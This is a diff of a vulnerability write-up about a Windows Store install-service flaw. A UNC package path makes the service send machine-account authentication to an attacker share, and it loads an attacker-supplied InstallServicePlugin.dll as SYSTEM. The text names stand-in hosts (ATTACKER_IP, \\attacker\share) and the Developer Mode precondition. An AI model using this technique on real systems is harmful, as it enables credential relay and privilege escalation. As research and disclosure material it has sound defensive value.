@@ -110,14 +110,6 @@ the work the trigger creates is queued, and the queue retries. in my lab the ser
 
 the work item is queued to disk and replays on reboot. a single trigger keeps coercing the machine account on every restart until the package is removed (`Remove-AppxPackage DiscCoerceProbe_*`). not code-execution persistence on its own, but if you relay the first auth to land `InstallServicePlugin.dll` at the UNC, every retry after that runs your code as SYSTEM.
 
-## the non-admin story
-
-confirmed end to end as a real standard user. `coercelow`, `Users` only, medium integrity `S-1-16-8192`, `IsAdmin=False`. from that session i registered the UNC package (`InstalledLocation = \\ATTACKER_IP\coerce`) and called `CreateInstallServiceWork`, and the Kali listener caught `MY-WIN10$` immediately and again on every queue retry. the smb screenshot above is that capture.
-
-`Add-AppxPackage -Register` deploys into the logged-on user's session, so that user needs an interactive session. session-0 with nobody logged on fails `0x80073D19`.
-
-the only real precondition is **Developer Mode** on the target. common on dev/engineering machines, not on locked-down endpoints. removing it is the open lead, see limitations.
-
 ## LPE
 
 there is a second side to the same bug that is more direct than coercion. if `InstallServicePlugin.dll` actually exists on the UNC package path, the service still reaches the same `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)` branch, but this time the loader succeeds and the dll is mapped inside the store install service process as `NT AUTHORITY\SYSTEM`.
